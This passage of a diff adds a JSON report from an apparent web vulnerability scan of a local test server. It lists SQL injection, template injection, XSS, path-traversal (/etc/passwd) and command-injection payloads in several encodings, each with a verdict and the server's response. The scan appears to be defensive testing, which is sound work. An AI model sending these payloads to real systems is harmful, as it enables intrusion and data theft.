@@ -1,0 +1,1414 @@
+{
+  "summary": {
+    "endpoints": 4,
+    "requests": 200,
+    "records": 200,
+    "verdict_counts": {
+      "vulnerable": 81,
+      "safe": 50,
+      "inconclusive": 69
+    }
+  },
+  "records": [
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%27%20OR%201%3D1--",
+      "family": "sqli",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' OR 1=1--\" in: search results for: ' OR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%2527%2520OR%25201%253D1%252D%252D",
+      "family": "sqli",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' OR 1=1--\" in: search results for: ' OR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%252527%252520OR%2525201%25253D1%25252D%25252D",
+      "family": "sqli",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' OR 1=1--\" in: search results for: ' OR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%27%20or%201%3D1--",
+      "family": "sqli",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' or 1=1--\" in: search results for: ' or 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%27%20%D0%9ER%201%3D1--",
+      "family": "sqli",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: ' ОR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%27%20UNION%20SELECT",
+      "family": "sqli",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' UNION SELECT\" in: search results for: ' UNION SELECT"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%2527%2520UNION%2520SELECT",
+      "family": "sqli",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' UNION SELECT\" in: search results for: ' UNION SELECT"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%252527%252520UNION%252520SELECT",
+      "family": "sqli",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' UNION SELECT\" in: search results for: ' UNION SELECT"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%27%20union%20select",
+      "family": "sqli",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' union select\" in: search results for: ' union select"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%27%20%D5%8DNION%20SELECT",
+      "family": "sqli",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: ' ՍNION SELECT"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%7B%7B7%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '{{7*7}}' in: search results for: {{7*7}}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%257B%257B7%252A7%257D%257D",
+      "family": "ssti",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '{{7*7}}' in: search results for: {{7*7}}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%25257B%25257B7%25252A7%25257D%25257D",
+      "family": "ssti",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '{{7*7}}' in: search results for: {{7*7}}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%7B%7B%EF%BC%97%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: {{７*7}}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%EF%BD%9B%7B7%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: ｛{7*7}}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%24%7B7%2A7%7D",
+      "family": "ssti",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '${7*7}' in: search results for: ${7*7}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%2524%257B7%252A7%257D",
+      "family": "ssti",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '${7*7}' in: search results for: ${7*7}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%252524%25257B7%25252A7%25257D",
+      "family": "ssti",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '${7*7}' in: search results for: ${7*7}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%24%7B%EF%BC%97%2A7%7D",
+      "family": "ssti",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: ${７*7}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%EF%BC%84%7B7%2A7%7D",
+      "family": "ssti",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: ＄{7*7}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "family": "xss",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '<script>alert(1)</script>' in: search results for: <script>alert(1)</script>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
+      "family": "xss",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '<script>alert(1)</script>' in: search results for: <script>alert(1)</script>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E",
+      "family": "xss",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '<script>alert(1)</script>' in: search results for: <script>alert(1)</script>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E",
+      "family": "xss",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '<SCRIPT>ALERT(1)</SCRIPT>' in: search results for: <SCRIPT>ALERT(1)</SCRIPT>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%3C%D5%95cript%3Ealert%281%29%3C%2Fscript%3E",
+      "family": "xss",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: <Օcript>alert(1)</script>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "family": "xss",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '\"><img src=x onerror=alert(1)>' in: search results for: \"><img src=x onerror=alert(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
+      "family": "xss",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '\"><img src=x onerror=alert(1)>' in: search results for: \"><img src=x onerror=alert(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%252522%25253E%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert%2525281%252529%25253E",
+      "family": "xss",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '\"><img src=x onerror=alert(1)>' in: search results for: \"><img src=x onerror=alert(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%22%3E%3CIMG%20SRC%3DX%20ONERROR%3DALERT%281%29%3E",
+      "family": "xss",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '\"><IMG SRC=X ONERROR=ALERT(1)>' in: search results for: \"><IMG SRC=X ONERROR=ALERT(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%22%3E%3C%D1%96mg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "family": "xss",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: \"><іmg src=x onerror=alert(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=..%2F..%2F..%2Fetc%2Fpasswd",
+      "family": "path_traversal",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '../../../etc/passwd' in: search results for: ../../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
+      "family": "path_traversal",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '../../../etc/passwd' in: search results for: ../../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fetc%25252Fpasswd",
+      "family": "path_traversal",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '../../../etc/passwd' in: search results for: ../../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=..%2F..%2F..%2FETC%2FPASSWD",
+      "family": "path_traversal",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '../../../ETC/PASSWD' in: search results for: ../../../ETC/PASSWD"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=..%2F..%2F..%2F%D0%B5tc%2Fpasswd",
+      "family": "path_traversal",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: ../../../еtc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "family": "path_traversal",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "decoded traversal fragment '../../etc/passwd' in: search results for: ../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
+      "family": "path_traversal",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "decoded traversal fragment '../../etc/passwd' in: search results for: ../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc%2525252fpasswd",
+      "family": "path_traversal",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '%2e%2e%2f%2e%2e%2fetc%2fpasswd' in: search results for: %2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%252E%252E%252F%252E%252E%252FETC%252FPASSWD",
+      "family": "path_traversal",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "decoded traversal fragment '../../ETC/PASSWD' in: search results for: ../../ETC/PASSWD"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%252%D0%B5%252e%252f%252e%252e%252fetc%252fpasswd",
+      "family": "path_traversal",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: %2е./../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%3Bid",
+      "family": "command_injection",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment ';id' in: search results for: ;id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%253Bid",
+      "family": "command_injection",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment ';id' in: search results for: ;id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%25253Bid",
+      "family": "command_injection",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment ';id' in: search results for: ;id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%3BID",
+      "family": "command_injection",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment ';ID' in: search results for: ;ID"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%3B%D1%96d",
+      "family": "command_injection",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: ;іd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%7Cid",
+      "family": "command_injection",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '|id' in: search results for: |id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%257Cid",
+      "family": "command_injection",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '|id' in: search results for: |id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%25257Cid",
+      "family": "command_injection",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '|id' in: search results for: |id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%7CID",
+      "family": "command_injection",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '|ID' in: search results for: |ID"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/search?q=%7C%D1%96d",
+      "family": "command_injection",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: search results for: |іd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%27%20OR%201%3D1--",
+      "family": "sqli",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' OR 1=1--\" in: rendered: ' OR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%2527%2520OR%25201%253D1%252D%252D",
+      "family": "sqli",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' OR 1=1--\" in: rendered: ' OR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%252527%252520OR%2525201%25253D1%25252D%25252D",
+      "family": "sqli",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' OR 1=1--\" in: rendered: ' OR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%27%20or%201%3D1--",
+      "family": "sqli",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' or 1=1--\" in: rendered: ' or 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%27%20%D0%9ER%201%3D1--",
+      "family": "sqli",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: ' ОR 1=1--"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%27%20UNION%20SELECT",
+      "family": "sqli",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' UNION SELECT\" in: rendered: ' UNION SELECT"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%2527%2520UNION%2520SELECT",
+      "family": "sqli",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' UNION SELECT\" in: rendered: ' UNION SELECT"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%252527%252520UNION%252520SELECT",
+      "family": "sqli",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' UNION SELECT\" in: rendered: ' UNION SELECT"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%27%20union%20select",
+      "family": "sqli",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment \"' union select\" in: rendered: ' union select"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%27%20%D5%8DNION%20SELECT",
+      "family": "sqli",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: ' ՍNION SELECT"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%7B%7B7%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature '49' in: rendered: 49"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%257B%257B7%252A7%257D%257D",
+      "family": "ssti",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature '49' in: rendered: 49"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%25257B%25257B7%25252A7%25257D%25257D",
+      "family": "ssti",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature '49' in: rendered: 49"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%7B%7B%EF%BC%97%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: {{７*7}}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%EF%BD%9B%7B7%2A7%7D%7D",
+      "family": "ssti",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: ｛{7*7}}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%24%7B7%2A7%7D",
+      "family": "ssti",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature '49' in: rendered: 49"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%2524%257B7%252A7%257D",
+      "family": "ssti",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature '49' in: rendered: 49"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%252524%25257B7%25252A7%25257D",
+      "family": "ssti",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "injection result feature '49' in: rendered: 49"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%24%7B%EF%BC%97%2A7%7D",
+      "family": "ssti",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: ${７*7}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%EF%BC%84%7B7%2A7%7D",
+      "family": "ssti",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: ＄{7*7}"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "family": "xss",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '<script>alert(1)</script>' in: rendered: <script>alert(1)</script>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
+      "family": "xss",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '<script>alert(1)</script>' in: rendered: <script>alert(1)</script>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E",
+      "family": "xss",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '<script>alert(1)</script>' in: rendered: <script>alert(1)</script>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E",
+      "family": "xss",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '<SCRIPT>ALERT(1)</SCRIPT>' in: rendered: <SCRIPT>ALERT(1)</SCRIPT>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%3C%D5%95cript%3Ealert%281%29%3C%2Fscript%3E",
+      "family": "xss",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: <Օcript>alert(1)</script>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "family": "xss",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '\"><img src=x onerror=alert(1)>' in: rendered: \"><img src=x onerror=alert(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",
+      "family": "xss",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '\"><img src=x onerror=alert(1)>' in: rendered: \"><img src=x onerror=alert(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%252522%25253E%25253Cimg%252520src%25253Dx%252520onerror%25253Dalert%2525281%252529%25253E",
+      "family": "xss",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '\"><img src=x onerror=alert(1)>' in: rendered: \"><img src=x onerror=alert(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%22%3E%3CIMG%20SRC%3DX%20ONERROR%3DALERT%281%29%3E",
+      "family": "xss",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '\"><IMG SRC=X ONERROR=ALERT(1)>' in: rendered: \"><IMG SRC=X ONERROR=ALERT(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%22%3E%3C%D1%96mg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+      "family": "xss",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: \"><іmg src=x onerror=alert(1)>"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=..%2F..%2F..%2Fetc%2Fpasswd",
+      "family": "path_traversal",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '../../../etc/passwd' in: rendered: ../../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
+      "family": "path_traversal",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '../../../etc/passwd' in: rendered: ../../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fetc%25252Fpasswd",
+      "family": "path_traversal",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '../../../etc/passwd' in: rendered: ../../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=..%2F..%2F..%2FETC%2FPASSWD",
+      "family": "path_traversal",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '../../../ETC/PASSWD' in: rendered: ../../../ETC/PASSWD"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=..%2F..%2F..%2F%D0%B5tc%2Fpasswd",
+      "family": "path_traversal",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: ../../../еtc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "family": "path_traversal",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "decoded traversal fragment '../../etc/passwd' in: rendered: ../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
+      "family": "path_traversal",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "decoded traversal fragment '../../etc/passwd' in: rendered: ../../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc%2525252fpasswd",
+      "family": "path_traversal",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '%2e%2e%2f%2e%2e%2fetc%2fpasswd' in: rendered: %2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%252E%252E%252F%252E%252E%252FETC%252FPASSWD",
+      "family": "path_traversal",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "decoded traversal fragment '../../ETC/PASSWD' in: rendered: ../../ETC/PASSWD"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%252%D0%B5%252e%252f%252e%252e%252fetc%252fpasswd",
+      "family": "path_traversal",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: %2е./../etc/passwd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%3Bid",
+      "family": "command_injection",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment ';id' in: rendered: ;id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%253Bid",
+      "family": "command_injection",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment ';id' in: rendered: ;id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%25253Bid",
+      "family": "command_injection",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment ';id' in: rendered: ;id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%3BID",
+      "family": "command_injection",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment ';ID' in: rendered: ;ID"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%3B%D1%96d",
+      "family": "command_injection",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: ;іd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%7Cid",
+      "family": "command_injection",
+      "variant": "original",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '|id' in: rendered: |id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%257Cid",
+      "family": "command_injection",
+      "variant": "url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '|id' in: rendered: |id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%25257Cid",
+      "family": "command_injection",
+      "variant": "double_url_encoded",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '|id' in: rendered: |id"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%7CID",
+      "family": "command_injection",
+      "variant": "case_swapped",
+      "verdict": "vulnerable",
+      "evidence": "unescaped payload fragment '|ID' in: rendered: |ID"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/render?t=%7C%D1%96d",
+      "family": "command_injection",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: rendered: |іd"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%27%20OR%201%3D1--",
+      "family": "sqli",
+      "variant": "original",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%2527%2520OR%25201%253D1%252D%252D",
+      "family": "sqli",
+      "variant": "url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%252527%252520OR%2525201%25253D1%25252D%25252D",
+      "family": "sqli",
+      "variant": "double_url_encoded",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%27%20or%201%3D1--",
+      "family": "sqli",
+      "variant": "case_swapped",
+      "verdict": "inconclusive",
+      "evidence": "no exploit marker or neutralisation marker found; response: [request-error] HTTPError: HTTP Error 404: Not Found"
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/profile?name=%27%20%D0%9ER%201%3D1--",
+      "family": "sqli",
+      "variant": "homoglyph",
+      "verdict": "inconclusive",
